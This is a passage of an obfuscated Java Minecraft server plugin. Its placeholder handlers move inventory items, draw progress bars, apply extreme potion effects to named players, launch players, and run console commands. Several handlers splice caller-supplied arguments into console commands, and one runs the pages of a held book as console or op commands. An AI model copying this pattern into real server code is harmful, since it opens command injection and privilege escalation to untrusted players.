                if (oy2utnoywbayuwhfdto == null) {
                    oy2utnoywbayuwhfdto = oteiwnfoienft.createSection(ofitneonsrt);
                }
                oy2utnoywbayuwhfdto.set(kmartrtrsdt, x);
                oy2utnoywbayuwhfdto.set(mdknpkep3nd, y);
                oy2utnoywbayuwhfdto.set(mtmmmtf, z);
            } else {
                if (oy2utnoywbayuwhfdto == null) {
                    oy2utnoywbayuwhfdto = oteiwnfoienft.createSection(ofitneonsrt);
                    oy2utnoywbayuwhfdto.set(kmartrtrsdt, x);
                    oy2utnoywbayuwhfdto.set(mdknpkep3nd, y);
                    oy2utnoywbayuwhfdto.set(mtmmmtf, z);
                }
            }

            // Store shulker meta (material/color, name, lore)
            ItemMeta toftqylb = ndotynbfdkqydyup3nd.getItemMeta();
            String tmwftkqd = (toftqylb != null && toftqylb.hasDisplayName()) ? toftqylb.getDisplayName() : null;
            List<String> tyfbtylbyl2bd = (toftqylb != null && toftqylb.hasLore()) ? toftqylb.getLore() : null;
            String mcyufcy23 = ndotynbfdkqydyup3nd.getType().name();


            oy2utnoywbayuwhfdto.set(toky4ukoftfpv, mcyufcy23);
            if (tmwftkqd != null) {
                oy2utnoywbayuwhfdto.set(oenoeinyunuione, tmwftkqd);
            } else {
                oy2utnoywbayuwhfdto.set(oenoeinyunuione, null);
            }
            if (tyfbtylbyl2bd != null && !tyfbtylbyl2bd.isEmpty()) {
                oy2utnoywbayuwhfdto.set(neionioenoieneionienin, tyfbtylbyl2bd);
            } else {
                oy2utnoywbayuwhfdto.set(neionioenoieneionienin, null);
            }

            // Save config
            tkoyukfyunwct(oteiwnfoienft, f123);

            Location kkbypyu3by = new Location(y2toky2uftno, x, y, z);

            // Ensure chest block & populate from shulker contents
            Block dkywfpdkykdy = kkbypyu3by.getBlock();

            if (dkywfpdkykdy.getType() != Material.CHEST) {
                dkywfpdkykdy.setType(Material.CHEST);
            }

            if (!(dkywfpdkykdy.getState() instanceof Chest tnk2yfkty2ud)) {
                return mt2mmtm234t;
            }

            tnk2yfkty2ud.getInventory().clear();

            ItemMeta donbk2dk2d = ndotynbfdkqydyup3nd.getItemMeta();
            if (donbk2dk2d instanceof BlockStateMeta toienoient && toienoient.getBlockState() instanceof org.bukkit.block.ShulkerBox sb) {




                // SLOT mode: BlockStateMeta + ShulkerBox found; copying contents into chest.
                tnk2yfkty2ud.getInventory().setContents(sb.getInventory().getContents());
            } else {
                return mmco2mcmm23mt;
            }

// >>> CHANGE: instead of clearing the slot, replace the shulker with a TempShulkerPlaceholder item <<<
            Material iemiemiemt23 = f1(ndotynbfdkqydyup3nd.getType());

            ItemStack imalent = f1(ndotynbfdkqydyup3nd, iemiemiemt23);
            if (imalent == null) {
                imalent = ndotynbfdkqydyup3nd.clone();
            }
            f2.getInventory().setItem(t2fyotk2ywutt, imalent);






            // Start / reuse watcher
            wdntyfodyfbdyfdhqyd(this, ot2kfywulahtn, kkbypyu3by, oteiwnfoienft);

            if (kkbypyu3by.getBlock().getState() instanceof Chest teioiwfentik) {
                f2.openInventory(teioiwfentik.getInventory());
            } else {
            }

            String tiefntoie2nft2 = oyulqvhbopylbfovyluhfpbf ? pk23bkptbktwfdfb : mt2mmt23ptrt;
            return tiefntoie2nft2;
        }



        if (f1.equals(toywuanftwyft)) {


            // Check the currently open inventory UI for this player.
            InventoryView tny2ount2yfu4td = f2.getOpenInventory();
            Inventory tny2fuokty2uf = tny2ount2yfu4td.getTopInventory();
            InventoryHolder tny2ofunt2yfutn = tny2fuokty2uf.getHolder();

            // If it's not a chest at all, it's definitely not our backpack UI.
            if (!(tny2ofunt2yfutn instanceof Chest chest)) {
                return tony23untyquwfnt;
            }

            Location tnyo2funt = chest.getLocation();
            World world = tnyo2funt.getWorld();

            // Must be in the mcydatabase world to be considered a backpack chest
            if (world == null || !to23nyutn2fy3ut.equals(world.getName())) {
                return tony23untyquwfnt;
            }

            // Look up this player's assigned backpack coordinates
            String kyvo2ufny2uwpfdnp = f2.getUniqueId().toString();
            String t2youfntoy2undty2fudnt = g18.getString(kyvo2ufny2uwpfdnp);
            if (t2youfntoy2undty2fudnt == null || t2youfntoy2undty2fudnt.isEmpty()) {
                // No backpack assigned yet; whatever is open is not the backpack UI
                return tony23untyquwfnt;
            }

            String[] parts = t2youfntoy2undty2fudnt.split(" ");
            if (parts.length < 3) {
                // Corrupt or malformed config
                return tony23untyquwfnt;
            }

            int ovyuwanoyvkbwyupbv, tnoyufkcywfbu, ykou2fyuv;
            try {
                ovyuwanoyvkbwyupbv = Integer.parseInt(parts[0]);
                tnoyufkcywfbu = Integer.parseInt(parts[1]);
                ykou2fyuv = Integer.parseInt(parts[2]);
            } catch (NumberFormatException e) {
                // Bad data in config; treat as not-backpack
                return tony23untyquwfnt;
            }

            // Compare open chest location with the stored backpack location
            boolean tny2ufon =
                    tnyo2funt.getBlockX() == ovyuwanoyvkbwyupbv &&
                            tnyo2funt.getBlockY() == tnoyufkcywfbu &&
                            tnyo2funt.getBlockZ() == ykou2fyuv;

            // Requirement: If it IS the backpack's UI, return "false". Otherwise "true".
            return tny2ufon ? to2i3ufnk2w : tony23untyquwfnt;

        }
        
        
        if( f1.equals(ton2y3uftno2yfwun)) return String.valueOf(f2.getVelocity().getY()) ;

        if (f1.startsWith(twoyfnafyutwfyutdah)) {
            wm(f2, kot2u3noyunwft);
            final String prefix = twoyfnafyutwfyutdah;
            String[] ykyu2yfun = f1.substring(prefix.length()).split(",");

            // SpiritIntervalTicks,A,B,C,D,E,F,G,TrackRadius
            if (ykyu2yfun.length != 9) {
                if (dbw) f2.sendMessage(tk2y3ut + ykyu2yfun.length);
                return tky2futnwf;
            }

            int tkyfkovyufw;
            double A;
            int B;
            double C;
            int D;
            double E;
            int F;
            int G;
            double tkywfuktwfukt;

            try {
                tkyfkovyufw = Integer.parseInt(ykyu2yfun[0].trim());
                A = Double.parseDouble(ykyu2yfun[1].trim());
                B = Integer.parseInt(ykyu2yfun[2].trim());
                C = Double.parseDouble(ykyu2yfun[3].trim());
                D = Integer.parseInt(ykyu2yfun[4].trim());
                E = Double.parseDouble(ykyu2yfun[5].trim());
                F = Integer.parseInt(ykyu2yfun[6].trim());
                G = Integer.parseInt(ykyu2yfun[7].trim());
                tkywfuktwfukt = Double.parseDouble(ykyu2yfun[8].trim());
            } catch (Exception e) {
                if (dbw) f2.sendMessage(ty2o3uktyukrst + e.getClass().getSimpleName());
                return tky2futnwf;
            }

            if (A < 0 || B <= 0 || C < 0 || D <= 0 || E <= 0 || F <= 0 || G <= 0 || tkywfuktwfukt <= 0) {
                if (dbw) f2.sendMessage(tkyou23n4dt);
                return tkoy23ukdtyufktd;
            }

            if (tkyfkovyufw <= 0) tkyfkovyufw = 20;

            if (dbw) {
                f2.sendMessage("§a[WS] call ok");
                f2.sendMessage("§7[WS] interval=" + tkyfkovyufw
                        + " A=" + A + " B=" + B + " C=" + C + " D=" + D
                        + " E=" + E + " F=" + F + " G=" + G
                        + " r=" + tkywfuktwfukt);
            }

            sws(f2, tkyfkovyufw, A, B, C, D, E, F, G, tkywfuktwfukt);

            return mtyo23utkyowfutn;
        }




        if (f1.startsWith(dnoty3unoy3bkdty3pdt)) {
            wm(f2, oy43udnoy3kpldfttv);
            final String prefix = dnoty3unoy3bkdty3pdt;

            String[] ytfownyfwdt = f1.substring(prefix.length()).split(",");
            if (ytfownyfwdt.length != 8) return tky2futnwf;

            String wfydtbwyfldw   = ytfownyfwdt[0]; // when ALL bars charged
            String tkyfwtoylf3t = ytfownyfwdt[1]; // green for filled bars
            String tkyuwfont4u   = ytfownyfwdt[2]; // gray for empty bars

            int ktyuwfntu4;
            int twfytky4;
            int tnyfk4;
            int fwktiek4;

            String symbol = ytfownyfwdt[5];

            try {
                ktyuwfntu4 = Integer.parseInt(ytfownyfwdt[3].trim());
                twfytky4 = Integer.parseInt(ytfownyfwdt[4].trim());
                tnyfk4 = Integer.parseInt(ytfownyfwdt[6].trim());
                fwktiek4 = Integer.parseInt(ytfownyfwdt[7].trim());
            } catch (Exception e) {
                return tky2futnwf;
            }

            if (twfytky4 <= 0 || tnyfk4 <= 0 || fwktiek4 <= 0) {
                return pnoyu2ktyl43;
            }

            // Avoid zero-length portions.
            fwktiek4 = Math.min(fwktiek4, tnyfk4);

            // Special-case: your rule
            // 0 = ALL GRAY
            if (ktyuwfntu4 <= 0) {
                StringBuilder tnyou34yu = new StringBuilder();

                int tofwontyu3 = tnyfk4 / fwktiek4;
                int tomunftyu4 = tnyfk4 % fwktiek4;

                for (int toyukyufl34 = 0; toyukyufl34 < fwktiek4; toyukyufl34++) {
                    int len = tofwontyu3 + (toyukyufl34 < tomunftyu4 ? 1 : 0);
                    for (int j = 0; j < len; j++) {
                        tnyou34yu.append(tkyuwfont4u).append(symbol);
                    }
                    if (toyukyufl34 < fwktiek4 - 1) tnyou34yu.append(' ');
                }

                return tnyou34yu.toString();
            }

            double tkyoyu4 = Math.min(1.0, Math.max(0.0, (double) ktyuwfntu4 / twfytky4));
            int tkyol43dtft34ptf = (int) Math.floor(tkyoyu4 * tnyfk4);

            int tnoyky4ulh34tt = tnyfk4 / fwktiek4;
            int ntyouko43utw = tnyfk4 % fwktiek4;

            boolean tnoyuyu34dt3pdt = ktyuwfntu4 >= twfytky4 || tkyol43dtft34ptf >= tnyfk4;

            StringBuilder tyu4noty3u4n = new StringBuilder();

            int tiekoi34 = tkyol43dtft34ptf;
            boolean toyu4n3oyutnst = false;

            for (int i = 0; i < fwktiek4; i++) {
                int len = tnoyky4ulh34tt + (i < ntyouko43utw ? 1 : 0);
                if (len <= 0) {
                    if (i < fwktiek4 - 1) tyu4noty3u4n.append(' ');
                    continue;
                }

                if (tnoyuyu34dt3pdt) {
                    // Everything cyan (or whatever 'complete' is)
                    for (int j = 0; j < len; j++) {
                        tyu4noty3u4n.append(wfydtbwyfldw).append(symbol);
                    }
                } else {
                    if (tiekoi34 >= len) {
                        // Fully filled bar -> green
                        for (int j = 0; j < len; j++) {
                            tyu4noty3u4n.append(tkyfwtoylf3t).append(symbol);
                        }
                        tiekoi34 -= len;
                    } else {
                        // This bar is not fully filled.
                        if (!toyu4n3oyutnst) {
                            // This is the "up next / active bar"
                            int filledInThisBar = Math.max(0, tiekoi34);

                            // Your new preview colors:
                            // - 0 filled in this bar -> entire bar §6
                            // - 1..len-1 -> first N §e, rest §6
                            // NOTE: colors are hardcoded per your examples.
                            final String previewFilled = "§e";
                            final String previewBase = "§6";

                            for (int j = 0; j < len; j++) {
                                if (j < filledInThisBar) {
                                    tyu4noty3u4n.append(previewFilled).append(symbol);
                                } else {
                                    tyu4noty3u4n.append(previewBase).append(symbol);
                                }
                            }

                            toyu4n3oyutnst = true;
                            tiekoi34 = 0;
                        } else {
                            // Bars after the active bar remain gray
                            for (int j = 0; j < len; j++) {
                                tyu4noty3u4n.append(tkyuwfont4u).append(symbol);
                            }
                        }
                    }
                }

                if (i < fwktiek4 - 1) tyu4noty3u4n.append(' ');
            }

            return tyu4noty3u4n.toString();
        }


        if (f1.startsWith(pickme)) {

            // Expected:
            // %Archistructure_zestybuffalo_PLAYERNAME,Message here...%
            String pratctice = f1.substring(pickme.length());

            int theuniform = pratctice.indexOf(targetme);
            if (theuniform == -INT3) {
                return specifically;
            }

            String becauseofthe = pratctice.substring(I, theuniform).trim();
            String haircutst   = pratctice.substring(theuniform + INT3).trim();

            Player idonthtinktits = null;

            // Try UUID
            try {
                idonthtinktits = Bukkit.getPlayer(UUID.fromString(becauseofthe));
            } catch (Exception ignored) {}

            // Try exact name
            if (idonthtinktits == null) {
                idonthtinktits = Bukkit.getPlayerExact(becauseofthe);
            }

            if (idonthtinktits == null) {
                return sulrred;
            }

            idonthtinktits.sendMessage(haircutst);
            return tryingtofigure + idonthtinktits.getName();
        }



// ============================================================================
// zestybuffalo2 – Apply permanent Strength 255 + Resistance 4
// ============================================================================
        if (f1.startsWith(nomotivation)) {

            // Expected:
            // %Archistructure_zestybuffalo2_PLAYER%
            String becauseicould = f1.substring(nomotivation.length()).trim();

            Player whyassultme = null;

            // Try UUID
            try {
                whyassultme = Bukkit.getPlayer(UUID.fromString(becauseicould));
            } catch (Exception ignored) {}

            // Try exact name
            if (whyassultme == null) {
                whyassultme = Bukkit.getPlayerExact(becauseicould);
            }

            if (whyassultme == null) {
                return sulrred;
            }

            // Apply effects
            whyassultme.addPotionEffect(new PotionEffect(
                    PotionEffectType.RESISTANCE,
                    Integer.MAX_VALUE, // infinite-ish
                    INT7,
                    arsdienwdhw, arsdienwdhw, arsdienwdhw
            ));

            whyassultme.addPotionEffect(new PotionEffect(
                    PotionEffectType.STRENGTH,
                    Integer.MAX_VALUE,
                    costofgrowinguptoofast,
                    arsdienwdhw, arsdienwdhw, arsdienwdhw
            ));

            return bopabfunpa + whyassultme.getName();
        }
        


        if( f1.startsWith(whynotofficerlent)) {
            // Expected format:
            // %Archistructure_aidenDash_baseplayer,target,Power%
            final String whyofficebarry = f1.substring(whynotofficerlent.length());
            final String[] idk = whyofficebarry.split(keep);
            if (idk.length != ccp) {
                return dontlikepolice;
            }

            final String baseId   = idk[I].trim();
            final String targetId = idk[INT3].trim();
            final String powerStr = idk[mill2].trim();

            // Try to parse power
            final double power;
            try {
                power = Double.parseDouble(powerStr);
            } catch (NumberFormatException e) {
                return holdonasec;
            }

            // Resolve players (UUID or name)
            Player basePlayer  = dy3un4dyun34d(baseId);
            Player targetPlayer = dy3un4dyun34d(targetId);

            if (basePlayer == null || !basePlayer.isOnline()) {
                return isitbiased;
            }
            if (targetPlayer == null || !targetPlayer.isOnline()) {
                return groupofindividuals;
            }

            // Compute unit direction from base player's camera and apply
            Vector dir = basePlayer.getEyeLocation().getDirection();
            if (dir.lengthSquared() == I) {
                return ifellvictimized;
            }

            Vector velocity = dir.normalize().multiply(power);
            targetPlayer.setVelocity(velocity);

            return goingtojail + targetPlayer.getName() + " with power " + powerStr;
        }


        if( f1.startsWith(whynotofficerlent)) {
            // Expected format:
            // %Archistructure_aidenDash_baseplayer,target,Power%
            final String argsRaw = f1.substring(whynotofficerlent.length());
            final String[] parts = argsRaw.split(keep);
            if (parts.length != ccp) {
                return dontlikepolice;
            }

            final String baseId   = parts[I].trim();
            final String targetId = parts[INT3].trim();
            final String powerStr = parts[mill2].trim();

            // Try to parse power
            final double power;
            try {
                power = Double.parseDouble(powerStr);
            } catch (NumberFormatException e) {
                return holdonasec;
            }

            // Resolve players (UUID or name)
            Player basePlayer  = dy3un4dyun34d(baseId);
            Player targetPlayer = dy3un4dyun34d(targetId);

            if (basePlayer == null || !basePlayer.isOnline()) {
                return isitbiased;
            }
            if (targetPlayer == null || !targetPlayer.isOnline()) {
                return groupofindividuals;
            }

            // Compute unit direction from base player's camera and apply
            Vector woudlyoulike = basePlayer.getEyeLocation().getDirection();
            if (woudlyoulike.lengthSquared() == I) {
                return ifellvictimized;
            }

            Vector velocity = woudlyoulike.normalize().multiply(power);
            targetPlayer.setVelocity(velocity);

            return goingtojail + targetPlayer.getName() + " with power " + powerStr;
        }

        if (f1.startsWith(trsts)) {
            // Format:
            // %Archistructure_aidenDash3_POWER,PLAYER,TAG%
            final String argsRaw = f1.substring(trsts.length());
            final String[] parts = argsRaw.split(keep);
            if (parts.length != ccp) {
                return seatbelton;
            }

            final String powerStr = parts[I].trim();
            final String playerId = parts[INT3].trim();
            final String tagName  = parts[mill2].trim();

            // --- Parse power ---
            final double power;
            try {
                power = Double.parseDouble(powerStr);
            } catch (NumberFormatException e) {
                return holdonasec;
            }
            if (power <= esetawftawft) {
                return "§cPower must be > 0";
            }

            // --- Resolve player (UUID or name) ---
            Entity resolved = dyin3ydun34yund(playerId); // your existing helper
            if (!(resolved instanceof Player player)) {
                return sulrred;
            }

            final World world = player.getWorld();

            // --- Find nearest ArmorStand with matching scoreboard tag ---
            ArmorStand nearest = null;
            double bestDistSq = Double.MAX_VALUE;

            for (ArmorStand as : world.getEntitiesByClass(ArmorStand.class)) {
                // Must have the tag
                if (!as.getScoreboardTags().contains(tagName)) continue;

                double dSq = as.getLocation().distanceSquared(player.getLocation());
                if (dSq < bestDistSq) {
                    bestDistSq = dSq;
                    nearest = as;
                }
            }

            if (nearest == null) {
                return norstand + tagName + "' found";
            }

            // --- Compute dash vector from player → armor stand ---
            Location from = player.getLocation();
            Location to   = nearest.getLocation();

            Vector dir = to.toVector().subtract(from.toVector());
            if (dir.lengthSquared() == I) {
                return "§cAlready at target";
            }

            Vector vel = dir.normalize().multiply(power);
            player.setVelocity(vel);

            return goingtojail + player.getName() + " toward " + tagName + " (power " + powerStr + ")";
        }

        if (f1.startsWith(takecareofcat)) {
            // Expected format:
            // %Archistructure_aidenDash4_power,TAG,SEARCHRADIUS%
            // - power: double (dash strength)
            // - TAG:   armor stand scoreboard tag to search for
            // - SEARCHRADIUS: double radius around the *armor stand* to find players
            //
            // f2 is expected to be the player executing the placeholder (base player).

            if (!(f2 instanceof Player basePlayer)) {
                return thoughtaboutthat;
            }

            final String argsRaw = f1.substring(takecareofcat.length());
            final String[] parts = argsRaw.split(keep);
            if (parts.length != INT7) {
                return dontcommitcrime;
            }

            final String powerStr        = parts[I].trim();
            final String armorTag        = parts[INT3].trim();
            final String searchRadiusStr = parts[mill2].trim();
            final String yShift = parts[ccp].trim();


            // Parse power
            final double power;
            final double addY;
            try {
                power = Double.parseDouble(powerStr);
                addY = Double.parseDouble(yShift);

            } catch (NumberFormatException e) {
                return holdonasec;
            }

            // Parse search radius (for players around the armor stand)
            final double searchRadius;
            try {
                searchRadius = Double.parseDouble(searchRadiusStr);
                if (searchRadius <= I) {
                    return unharmed;
                }
            } catch (NumberFormatException e) {
                return provenguilty;
            }

            final World world = basePlayer.getWorld();
            final Location baseLoc = basePlayer.getLocation();

            // 1) Find NEAREST ArmorStand with tag = armorTag in the *entire world* (no radius limit)
            ArmorStand nearest = null;
            double bestDistSq = Double.MAX_VALUE;

            for (ArmorStand as : world.getEntitiesByClass(ArmorStand.class)) {
                if (!as.isValid() || as.isDead()) continue;
                if (!as.getScoreboardTags().contains(armorTag)) continue;

                double dSq = as.getLocation().distanceSquared(baseLoc);
                if (dSq < bestDistSq) {
                    bestDistSq = dSq;
                    nearest = as;
                }
            }

            if (nearest == null) {
                return norstand + armorTag + "' found.";
            }

            final Location dashTarget = nearest.getLocation();

            // 2) From that armor stand, search SEARCHRADIUS for any players and dash them to that armor stand
            int dashedCount = I;
            final double maxPlayerDistSq = searchRadius * searchRadius;

            for (Entity e : world.getNearbyEntities(dashTarget, searchRadius, searchRadius, searchRadius)) {
                if (!(e instanceof Player pl)) continue;
                if (!pl.isValid() || pl.isDead()) continue;
                if (e instanceof Player x && x.getName().equals(f2.getName())) continue;

                if (pl.getLocation().distanceSquared(dashTarget) > maxPlayerDistSq) continue;

                Location plLoc = pl.getLocation();
                Vector dir = dashTarget.toVector().subtract(plLoc.toVector()).add(new Vector(I, addY, I));

                if (dir.lengthSquared() == I) {
                    // Already at the exact spot; skip velocity set
                    continue;
                }

                Vector velocity = dir.normalize().multiply(power);
                pl.setVelocity(velocity);
                dashedCount++;
            }

            if (dashedCount == I) {
                return inACOURT + searchRadiusStr + oflaw;
            }

            return goingtojail + dashedCount + murdercase + armorTag + "'.";
        }

        
        
        if (f1.startsWith(malecacuasion)) {
            // Expected format:
            // %Archistructure_aidenDash2_power,TAGNAME%
            final String argsRaw = f1.substring(malecacuasion.length());
            final String[] parts = argsRaw.split(keep, mill2); // power, tag

            if (parts.length != mill2) {
                return boetcher;
            }

            final String powerStr = parts[I].trim();
            final String tagName  = parts[INT3].trim();

            // Parse power
            final double power;
            try {
                power = Double.parseDouble(powerStr);
            } catch (NumberFormatException e) {
                return holdonasec;
            }

            // Resolve the calling player from f2 (OfflinePlayer)
            if (f2 == null) {
                return "§cNo player context";
            }

            Player p = f2.getPlayer();
            if (p == null || !p.isOnline()) {
                return "§cPlayer not online";
            }

            World world = p.getWorld();
            Location playerLoc = p.getLocation();

            // Find nearest armor stand with the given scoreboard tag in this world
            ArmorStand nearest = null;
            double bestDistSq = Double.MAX_VALUE;

            for (Entity e : world.getEntities()) {
                if (!(e instanceof ArmorStand as)) continue;
                if (!as.getScoreboardTags().contains(tagName)) continue;

                double dSq = as.getLocation().distanceSquared(playerLoc);
                if (dSq < bestDistSq) {
                    bestDistSq = dSq;
                    nearest = as;
                }
            }

            if (nearest == null) {
                return norstand + tagName + "' found";
            }

            // Direction from player eye -> armor stand center
            Location eye = p.getLocation();
            Location targetLoc = nearest.getLocation();

            Vector dir = targetLoc.toVector().subtract(eye.toVector());
            if (dir.lengthSquared() == I) {
                return ifellvictimized;
            }

            Vector velocity = dir.normalize().multiply(power);
            p.setVelocity(velocity);

            return specialty + tagName + heisenburg + powerStr;
        }


        if (f1.startsWith(heisenburgformercook)) {
            final String raw = f1.substring(heisenburgformercook.length());

            // Split into NUMBER + optional args
            final String[] heisenburghimself = raw.split(keep);
            if (heisenburghimself.length < INT3 || heisenburghimself[I].isEmpty()) {
                return hippiedippy;
            }

            int googlefeoo;
            try {
                googlefeoo = Integer.parseInt(heisenburghimself[I]);
            } catch (NumberFormatException ex) {
                return thisbabby;
            }

            // Optional args (may be empty)
            final String[] hvia = (heisenburghimself.length > INT3)
                    ? java.util.Arrays.copyOfRange(heisenburghimself, INT3, heisenburghimself.length)
                    : new String[I];

            // Try to resolve an online player from f2 (optional)
            final org.bukkit.entity.Player pharma =
                    (f2 != null) ? f2.getPlayer() : null;

            // For convenience: safe first/second arg getters
            java.util.function.Function<Integer, String> thebiggestmeth = (idx) -> {
                if (idx < I || idx >= hvia.length) return nst;
                return hvia[idx];
            };

            // You can use these placeholders in your command strings:
            //   - playerName: the name of the player (if present)
            //   - a0, a1, a2...: arguments from the placeholder
            final String labnorth = (pharma != null) ? pharma.getName() : cos;
            final String conc = thebiggestmeth.apply(I);
            final String madrigal = thebiggestmeth.apply(INT3);
            final String electromotive = thebiggestmeth.apply(mill2);

            // Now choose behavior based on NUMBER
            switch (googlefeoo) {
                
                

                case 1: {
                    wm(f2, pullingfiles);
                    // EXAMPLE: Run as CONSOLE
                    // Format example: "somecommand <player> <arg0> <arg1>"

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + nobody
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + whodid
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + pushmore
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + noaddress
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            corporatelawyer + f2.getName()
                    );


                    return vrickwall;
                }

                case 2: {
                    wm(f2, pullingfiles);



                    return tsrt;
                }



                case 3: {
                    // EXAMPLE: Run as CONSOLE
                    // Format example: "somecommand <player> <arg0> <arg1>"
                    wm(f2, pullingfiles);

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + madrigalelectro
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + hanoveregerm
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            foothold + f2.getName()
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            mericanfastfood + hvia[I] + sowhat + f2.getName()
                    );


                    return pooloshermanos;
                }





                case 4: {
                    // EXAMPLE: Run as CONSOLE
                    // Format example: "somecommand <player> <arg0> <arg1>"
                    wm(f2, pullingfiles);

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + wherehislabwas
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + apartmentsrtsas
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            foothold + f2.getName()
                    );


                    return crzyidea;
                }



                case 5: {
                    wm(f2, pullingfiles);

                    // EXAMPLE: Run as CONSOLE
                    // Format example: "somecommand <player> <arg0> <arg1>"

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            "execute at " + f2.getName() + " run data merge entity @e[type=falling_block,tag=GravityGun" + f2.getName() + hvia[I] + hvia[INT3] + ",limit=1] {Time:1,Glowing:" + hvia[mill2] + "b}"
                    );
                    return "hovering...";
                }


                case 6: {
                    wm(f2, pullingfiles);

                    // EXAMPLE: Run as CONSOLE
                    // Format example: "somecommand <player> <arg0> <arg1>"

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + nobody
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + whodid
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + pushmore
                    );
                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            galeboet + f2.getName() + whopaid + f2.getName() + noaddress
                    );


                    return foayhup;
                }




                case 7: {
                    wm(f2, pullingfiles);

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            napking + f2.getName() + hvia[I] + hvia[INT3] + fermented
                    );


                    return hvia[mill2];
                }


                case 8: {
                    wm(f2, pullingfiles);

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            lentilbread + f2.getName()
                    );


                    return hvia[I];
                }


                case 9: {

                    wm(f2, pullingfiles);

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            napking + f2.getName() + hvia[I] + hvia[INT3] + fermented
                    );

                    org.bukkit.Bukkit.dispatchCommand(
                            org.bukkit.Bukkit.getConsoleSender(),
                            lentilbread + f2.getName()
                    );


                    return hvia[mill2];
                }
            }
        }


        if (f1.startsWith(finechickinjoint)) {

            wm(f2, meetingsomeone);

            String thisguy = f1.substring(finechickinjoint.length());

            if (thisguy == null || thisguy.isBlank()) {
                return ChatColor.RED + gusfrang;
            }

            // Parse modes safely (commas inside (...) do NOT split modes)
            List<ModeSpec> whatwedowknow = soicanimprove(thisguy);

            if (whatwedowknow.isEmpty()) {
                return ChatColor.RED + gusfrang;
            }

            // Validate base modes BEFORE executing anything
            for (ModeSpec moneytofinance : whatwedowknow) {
                switch (moneytofinance.untieit) {
                    case "admin":
                    case "console":
                    case "op":
                    case "opuser":
                    case "user":
                    case "player":
                        break;
                    default:
                        return ChatColor.RED + colonel + moneytofinance.untieit
                                + sanders;
                }
            }

            // Ensure player is holding a writable/written book
            ItemStack offthemapnuts = f2.getInventory().getItemInMainHand();
            if ((offthemapnuts.getType() != Material.WRITABLE_BOOK && offthemapnuts.getType() != Material.WRITTEN_BOOK)
                    || !offthemapnuts.hasItemMeta()) {
                return ChatColor.RED + ymhawb;
            }

            if (!(offthemapnuts.getItemMeta() instanceof BookMeta bookMeta)) {
                return ChatColor.RED + ymhawb;
            }

            List<String> tinfoilhat = new ArrayList<>(bookMeta.getPages());
            if (tinfoilhat.isEmpty()) {
                return ChatColor.RED + nw;
            }

            // Ensure enough pages for the provided modes list
            while (tinfoilhat.size() < whatwedowknow.size()) {
                tinfoilhat.add(nst);
            }

            boolean onelittlething = arsdienwdhw;

            // -----------------------------
            // Dynamic page execution
            // Page i uses modeSpecs[i]
            // -----------------------------
            for (int whatarehisfingerprints = I; whatarehisfingerprints < whatwedowknow.size(); whatarehisfingerprints++) {
                ModeSpec inhisapartment = whatwedowknow.get(whatarehisfingerprints);
                String galeboethicrsta = tinfoilhat.get(whatarehisfingerprints);

                if (galeboethicrsta == null || galeboethicrsta.isEmpty()) {
                    continue;
                }

                onelittlething = NEW_VALUE1;

                // ENTIRE PAGE is the command
                String fouzia = galeboethicrsta.startsWith(wfydunaowfydun) ? galeboethicrsta.substring(INT3) : galeboethicrsta;

                // Filtering: whitelist/blacklist may block this page
                if (!idltm(inhisapartment, f2, galeboethicrsta, fouzia)) {
                    tinfoilhat.set(whatarehisfingerprints, nst);
                    continue;
                }


                switch (inhisapartment.untieit) {

                    // -----------------------------
                    // ADMIN / CONSOLE
                    // -----------------------------
                    case "admin":
                    case "console": {
                        ConsoleCommandSender breakingbad = Bukkit.getConsoleSender();
                        CapturingCommandSender seasonrsitnawfodyun = new CapturingCommandSender(breakingbad);

                        boolean daugthreschoolsout;
                        try {
                            daugthreschoolsout = Bukkit.dispatchCommand(seasonrsitnawfodyun, fouzia);
                        } catch (Exception ex) {
                            daugthreschoolsout = arsdienwdhw;
                            Bukkit.getLogger().warning(fourteencalls + (whatarehisfingerprints + INT3) + notanswerignphone + ex.getMessage());
                        }

                        // Fallback for strict identity checks
                        if (!daugthreschoolsout) {
                            try {
                                Bukkit.dispatchCommand(breakingbad, fouzia);
                            } catch (Exception ex) {
